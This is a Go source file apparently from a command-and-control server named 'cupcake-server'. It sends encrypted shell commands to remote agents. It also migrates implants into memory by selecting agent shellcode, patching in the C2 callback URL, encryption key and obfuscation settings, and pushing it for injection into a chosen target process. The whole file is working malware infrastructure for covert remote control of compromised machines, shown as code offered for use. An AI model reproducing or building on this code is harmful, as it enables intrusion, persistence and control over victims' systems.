package services

import (
	"cupcake-server/pkg/globals"
	"cupcake-server/pkg/store"
	"encoding/base64"
	"fmt"
	"log"
	"os"
	"path/filepath"
	"strings"
	"time"
)

// SendCommand sends a shell command to the agent
func SendCommand(uuid string, command string) error {
	val, ok := globals.Clients.Load(uuid)
	if !ok {
		return fmt.Errorf("agent offline")
	}
	client := val.(*globals.Client)

	// OpSec: Filter out obvious UI pings if they ever reach here
	if strings.Contains(command, "ping") { return nil }

	reqID := fmt.Sprintf("CMD-%d", globals.GetNextReqID())
	msg := globals.MessageWrapper{
		MsgType: "command",
		Payload: globals.CommandPayload{
			CommandType:    "shell",
			CommandContent: command,
			ReqID:          reqID,
		},
	}

	// [LOGGING] Record command to DB
	_ = store.CreateCommandLog(uuid, reqID, "shell", command)

	return WriteEncryptedMessage(client, msg)
}

// MigrateToMemory handles the migration logic (Proper implementation from old main.go)
func MigrateToMemory(uuid string, targetProcess string) error {
	val, ok := globals.Clients.Load(uuid)
	if !ok { return fmt.Errorf("agent offline") }
	client := val.(*globals.Client)

	var raw []byte
	var err error
	
	searchArch := client.Arch
	if client.OS == "windows" {
		if client.Arch == "x86_64" || client.Arch == "amd64" { searchArch = "windows_amd64" }
	} else if client.OS == "linux" {
		if client.Arch == "x86_64" || client.Arch == "amd64" { searchArch = "linux_amd64" }
	}

	// Search for built artifacts
	matches, _ := filepath.Glob(filepath.Join("storage/payloads", fmt.Sprintf("agent_%s_*.bin", searchArch)))
	if len(matches) > 0 {
		var bestMatch string
		var bestTime time.Time
		for _, m := range matches {
			if info, err := os.Stat(m); err == nil {
				if info.ModTime().After(bestTime) {
					bestTime = info.ModTime()
					bestMatch = m
				}
			}
		}
		if bestMatch != "" { raw, _ = os.ReadFile(bestMatch) }
	}

	// Fallback to templates
	if len(raw) == 0 {
		templatePath := "assets/agent_win_x64_shellcode.bin"
		if client.OS == "linux" { templatePath = "assets/client_template_linux" }
		raw, err = os.ReadFile(templatePath)
		if err != nil { return fmt.Errorf("no suitable migration payload found: %v", err) }
	}

	// Patch Config for migration
	aesKey := store.GetSetting("system_aes_key")
	if client.EncryptKey != "" { aesKey = client.EncryptKey }
	
	// Determine C2 URL for the new process
	c2url := ""
	if val, ok := globals.Listeners.Load(client.ListenerID); ok {
		ln := val.(*globals.Listener)
		host := ln.PublicHost
		if host == "" { host = ln.BindIP }
		if host == "0.0.0.0" || host == "" {
			host = store.GetSetting("system_c2_host")
			if host == "" { host = "127.0.0.1" }
		}

		if ln.Protocol == "WebSocket" {
			c2url = fmt.Sprintf("ws://%s:%d/ws", host, ln.Port)
		} else {
			c2url = fmt.Sprintf("%s:%d", host, ln.Port)
		}
		log.Printf("[Migration] Using source listener %s URL: %s", ln.ID, c2url)
	}

	if c2url == "" {
		globals.Listeners.Range(func(k, v interface{}) bool {
			ln := v.(*globals.Listener)
			if ln.Status == "Running" {
				host := ln.PublicHost
				if host == "" { host = ln.BindIP }
				if host == "0.0.0.0" || host == "" { host = "127.0.0.1" }

				if ln.Protocol == "WebSocket" {
					c2url = fmt.Sprintf("ws://%s:%d/ws", host, ln.Port)
					return false
				} else if ln.Protocol == "TCP" {
					c2url = fmt.Sprintf("%s:%d", host, ln.Port)
					return false
				}
			}
			return true
		})
	}
	if c2url == "" {
		c2url = "ws://127.0.0.1:8081/ws"
	}

	// Fetch security context from parent client or listener
	salt := client.EncryptionSalt
	obf := client.ObfuscateMode
	if val, ok := globals.Listeners.Load(client.ListenerID); ok {
		ln := val.(*globals.Listener)
		if salt == "" { salt = ln.EncryptionSalt }
		if obf == "" { obf = ln.ObfuscateMode }
	}

	patched, err := PatchPayload(raw, c2url, aesKey, 10, "", false, 0, salt, obf)
	if err != nil { return fmt.Errorf("failed to patch migration template: %v", err) }

	reqID := fmt.Sprintf("MIG-%d", globals.GetNextReqID())
	msg := globals.MessageWrapper{
		MsgType: "command",
		Payload: globals.CommandPayload{
			CommandType:    "migrate",
			CommandContent: targetProcess,
			Data:           base64.StdEncoding.EncodeToString(patched),
			ReqID:          reqID,
		},
	}

	if err := WriteEncryptedMessage(client, msg); err != nil { return err }

	// [LOGGING] Record migration to DB
	_ = store.CreateCommandLog(uuid, reqID, "migrate", fmt.Sprintf("Target: %s", targetProcess))
	
	// Wait for response asynchronously or handled by GetResponse/WebSocket
	log.Printf("[Migration] Sent memory payload for agent %s", uuid)
	return nil
}
